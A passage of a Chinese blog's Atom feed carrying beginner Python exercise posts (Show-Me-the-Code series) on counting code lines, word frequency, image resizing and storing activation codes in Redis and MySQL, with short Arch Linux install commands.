rel="noopener">https://github.com/chrislinan/cx-extractor-python</a></li><li>使用NLTK的Gooe：(<a href="https://github.com/grangier/python-goose" target="_blank" rel="noopener">https://github.com/grangier/python-goose</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/jasondan/p/3497757.html" target="_blank" rel="noopener">https://www.cnblogs.com/jasondan/p/3497757.html</a></li><li><a href="https://piaosanlang.gitbooks.io/spiders/10day/section10.1.html" target="_blank" rel="noopener">https://piaosanlang.gitbooks.io/spiders/10day/section10.1.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;一个HTML文件，找出里面的正文。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0007</title>
    <link href="https://xiaotaoist.github.io/2018/05/31/python-exercise-0007/"/>
    <id>https://xiaotaoist.github.io/2018/05/31/python-exercise-0007/</id>
    <published>2018-05-31T00:27:30.000Z</published>
    <updated>2018-05-31T11:51:40.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先遍历文件夹内容，之前已经做过好多了，接着对空行(’\n’),注释(‘#’，‘’’多行注释’’’ / “””多行注释”””),代码(剩下的内容)分别计数即可。这里用到<a href="http://www.runoob.com/python3/python3-string.html" target="_blank" rel="noopener">字符串</a>的一些内置函数。值得注意的是如何统计多行注释，这里我用的是设置一个开关，遇到第一个注释符作为开始，第二个注释符作为结束，中间的内容全算注释。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_lines</span><span class="params">(code_dir)</span>:</span></span><br><span class="line">    code_lines = <span class="number">0</span></span><br><span class="line">    blank_lines = <span class="number">0</span></span><br><span class="line">    comment_lines = <span class="number">0</span></span><br><span class="line">    comment = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(code_dir):</span><br><span class="line">        filename = os.path.join(code_dir,file)</span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            text = f.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> text:</span><br><span class="line">            <span class="comment">#排除左边空格的干扰</span></span><br><span class="line">            line = line.lstrip(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#单行注释</span></span><br><span class="line">            <span class="keyword">if</span>(line.startswith(<span class="string">'#'</span>)):</span><br><span class="line">                comment_lines += <span class="number">1</span>  </span><br><span class="line">            </span><br><span class="line">            <span class="comment">#这里设置一个comment 作为开关</span></span><br><span class="line">            <span class="keyword">elif</span>(line.startswith(<span class="string">"'''"</span>) <span class="keyword">or</span> line.startswith(<span class="string">'"""'</span>)):</span><br><span class="line">                comment_lines += <span class="number">1</span></span><br><span class="line">                comment = <span class="keyword">not</span> comment  </span><br><span class="line">            </span><br><span class="line">            <span class="comment">#“”“内的换行也算作注释”“”</span></span><br><span class="line">            <span class="keyword">elif</span>(line.startswith(<span class="string">'\n'</span>)):</span><br><span class="line">                <span class="keyword">if</span> comment:</span><br><span class="line">                    comment_lines += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    blank_lines += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#非注释内的内容算作代码</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> comment:</span><br><span class="line">                    comment_lines += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    code_lines +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    total = code_lines + blank_lines + comment_lines</span><br><span class="line">    print(<span class="string">"共有代码:&#123;&#125;行"</span>.format(total))</span><br><span class="line">    print(<span class="string">"代码:&#123;&#125;行"</span>.format(code_lines))</span><br><span class="line">    print(<span class="string">"注释:&#123;&#125;行"</span>.format(comment_lines))</span><br><span class="line">    print(<span class="string">"空行:&#123;&#125;行"</span>.format(blank_lines))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    code_dir = <span class="string">'code'</span></span><br><span class="line">    count_lines(code_dir)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/Show-Me-the-Code/python" target="_blank" rel="noopener">https://github.com/Show-Me-the-Code/python</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0006</title>
    <link href="https://xiaotaoist.github.io/2018/05/30/python-exercise-0006/"/>
    <id>https://xiaotaoist.github.io/2018/05/30/python-exercise-0006/</id>
    <published>2018-05-29T22:35:30.000Z</published>
    <updated>2018-05-31T11:51:42.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p> 这里可以复用<a href="https://xiaotaoist.github.io/2018/05/28/python-exercise-0004/">0004</a>的代码统计每篇中最重要的词，这里需要注意排除常见高频词(the,are,of，to…)，这里只做一个简单的实现，若想真正进行词频分析需要使用<a href="http://www.nltk.org/" target="_blank" rel="noopener">NLTK</a>模块。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">most_common</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="comment">#读取文件，并全部转化为小写排除干扰</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read().lower()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#将标点等干扰全部替换成空格</span></span><br><span class="line">    text = re.sub(<span class="string">r'[,.!?:"]'</span>,<span class="string">' '</span>,text)</span><br><span class="line">    text = re.sub(<span class="string">r'-'</span>,<span class="string">''</span>,text)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#统计词频</span></span><br><span class="line">    counts = Counter(text.split())</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#过滤常见高频词</span></span><br><span class="line">    ignore_words=[<span class="string">'a'</span>,<span class="string">'at'</span>,<span class="string">'an'</span>,<span class="string">'and'</span>,<span class="string">'as'</span>,<span class="string">'by'</span>,<span class="string">'be'</span>,<span class="string">'of'</span>,<span class="string">'said'</span>,<span class="string">'for'</span>,<span class="string">'i'</span>,<span class="string">'it'</span>,<span class="string">'after'</span>,<span class="string">"it's"</span>,<span class="string">'in'</span>,<span class="string">'on'</span>,<span class="string">'is'</span>,<span class="string">'she'</span>,<span class="string">'us'</span>,<span class="string">'to'</span>,<span class="string">'not'</span>,<span class="string">'has'</span>,<span class="string">'the'</span>,<span class="string">'that'</span>,<span class="string">'this'</span>,<span class="string">'with'</span>,<span class="string">'have'</span>]</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> ignore_words:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> counts:</span><br><span class="line">            counts[word] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#输出最重要的1个词</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; the most word is &#123;&#125;"</span>.format(filename,counts.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    dirary_dir = <span class="string">'dirary'</span></span><br><span class="line">    <span class="comment">#遍历dirary目录的文件</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(dirary_dir):</span><br><span class="line">        filename = os.path.join(dirary_dir,file)</span><br><span class="line">        most_common(filename)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/Show-Me-the-Code/python" target="_blank" rel="noopener">https://github.com/Show-Me-the-Code/python</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0005</title>
    <link href="https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/"/>
    <id>https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/</id>
    <published>2018-05-28T22:35:30.000Z</published>
    <updated>2018-05-31T11:51:43.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里需要用<a href="http://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">OS</a>模块中的一些函数对文件和目录进行操作，然后使用<a href="http://effbot.org/imagingbook/image.htm" target="_blank" rel="noopener">PIL</a>库对图片进行调整，注意路径问题。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize</span><span class="params">(img_dir,MAX_RESIZE,out_dir)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(img_dir):</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#读取文件</span></span><br><span class="line">            img_file = os.path.join(img_dir,file)</span><br><span class="line">            img = Image.open(img_file)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#调整大小</span></span><br><span class="line">            out = img.resize(MAX_RESIZE)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#如果out文件夹不存在则新建一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_dir):</span><br><span class="line">                os.mkdir(out_dir)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#保存结果</span></span><br><span class="line">            out_img = os.path.join(out_dir,file)</span><br><span class="line">            out.save(out_img)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"操作失败！"</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img_dir =  <span class="string">'img'</span></span><br><span class="line">    out_dir =  <span class="string">'out'</span></span><br><span class="line">    MAX_RESIZE = (<span class="number">640</span>,<span class="number">1130</span>)</span><br><span class="line">    resize(img_dir,MAX_RESIZE,out_dir)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://baimoz.me/1399/" target="_blank" rel="noopener">http://baimoz.me/1399/</a>    </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0004</title>
    <link href="https://xiaotaoist.github.io/2018/05/28/python-exercise-0004/"/>
    <id>https://xiaotaoist.github.io/2018/05/28/python-exercise-0004/</id>
    <published>2018-05-28T06:01:12.000Z</published>
    <updated>2018-05-31T11:51:45.458Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>任一个英文的纯文本文件，统计其中的单词出现的个数。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里可以先从文件中读取内容，然后考虑到大小写问题（Text和text作为一个单词）,缩写问题(I’m 作为一个一个单词),连字符（末尾没写完新开一行te-xt）,标点符号（.,?:”）等问题后，把单词分割好，最后进行个数统计。<br>这里主要使用<a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="noopener">正则表达式</a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>用 Dict 统计词频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"text.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment">#读取文本内容并全部转换为小写字母</span></span><br><span class="line">    text = f.read().lower()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将标点符号替换成空格</span></span><br><span class="line">text = re.sub(<span class="string">r'[,.!?:"]'</span>,<span class="string">' '</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#去掉连字符</span></span><br><span class="line">text = re.sub(<span class="string">r'-'</span>,<span class="string">''</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将计次放入以单词为key的value中</span></span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> text.split():</span><br><span class="line">    <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> counts:</span><br><span class="line">        counts[word] = <span class="number">1</span></span><br><span class="line">    counts[word] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#按词频从大到小排序</span></span><br><span class="line">result = sorted(counts.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出统计结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></li><li><p>用<a href="https://docs.python.org/3/library/collections.html#collections.Counter" target="_blank" rel="noopener">collections</a>库中的Counter计数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read().lower()</span><br><span class="line">text = re.sub(<span class="string">r'[,.!?:"]'</span>,<span class="string">' '</span>,text)</span><br><span class="line">text = re.sub(<span class="string">r'-'</span>,<span class="string">''</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#统计词频</span></span><br><span class="line">counts = Counter(text.split())</span><br><span class="line"><span class="comment">#按顺序输出结果</span></span><br><span class="line">print(counts.most_common())</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431953239820157155d21c494e5786fce303f3018c86000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431953239820157155d21c494e5786fce303f3018c86000</a></li><li><a href="http://www.runoob.com/python/python-strings.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-strings.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;任一个英文的纯文本文件，统计其中的单词出现的个数。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0003</title>
    <link href="https://xiaotaoist.github.io/2018/05/27/python-exercise-0003/"/>
    <id>https://xiaotaoist.github.io/2018/05/27/python-exercise-0003/</id>
    <published>2018-05-27T08:41:12.000Z</published>
    <updated>2018-05-31T11:51:46.625Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 关系型数据库中。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>对Redis的介绍可以看<a href="http://www.runoob.com/redis/redis-intro.html" target="_blank" rel="noopener">菜鸟教程</a>，这里使用<a href="https://github.com/andymccurdy/redis-py" target="_blank" rel="noopener">redis-py</a>库。</p><blockquote><p>pip install redis</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Arch Linux 安装Redis<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S redis <span class="comment">#安装</span></span><br><span class="line">sudo systemctl start redis <span class="comment">#启动Redis数据库 或者使用  redis-server</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成激活码的函数</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate_Code</span><span class="params">(counts,length=<span class="number">20</span>)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(counts):</span><br><span class="line">        key = str(uuid.uuid4())[:length]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> key_list:</span><br><span class="line">            key_list.append(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建数据库连接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_conn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#用线程池的方式减少性能开销</span></span><br><span class="line">    pool = redis.ConnectionPool(host=<span class="string">'localhost'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">    r = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment">#将激活码用List方式储存到Redis数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updata_redis</span><span class="params">()</span>:</span></span><br><span class="line">    r = redis_conn()</span><br><span class="line">    key = Generate_Code(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        r.rpush(<span class="string">"Code"</span>,i)</span><br><span class="line">    r.save()</span><br><span class="line"></span><br><span class="line"><span class="comment">#从Redis读取数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdata</span><span class="params">()</span>:</span></span><br><span class="line">    r = redis_conn()</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> r.lrange(<span class="string">"Code"</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        print(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    updata_redis()</span><br><span class="line">    getdata()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.jianshu.com/p/2639549bedc8" target="_blank" rel="noopener">https://www.jianshu.com/p/2639549bedc8</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 关系型数据库中。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0002</title>
    <link href="https://xiaotaoist.github.io/2018/05/26/python-exercise-0002/"/>
    <id>https://xiaotaoist.github.io/2018/05/26/python-exercise-0002/</id>
    <published>2018-05-26T02:17:39.000Z</published>
    <updated>2018-05-31T11:51:48.065Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里考察的是对数据库的基本操作，这里使用<a href="https://github.com/PyMySQL/PyMySQL" target="_blank" rel="noopener">PyMySQL</a>库。</p><blockquote><p>pip install pymysql</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>目前Linux 的Mysql软件为MariaDB，它是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。以Arch Linux下安装MariaDB数据库为例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mariadb <span class="comment">#安装</span></span><br><span class="line">sudo  mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql <span class="comment">#初始化mysql库</span></span><br><span class="line">sudo systemctl start mariadb <span class="comment">#启动MariaDB数据库</span></span><br><span class="line">mysql -u root mysql <span 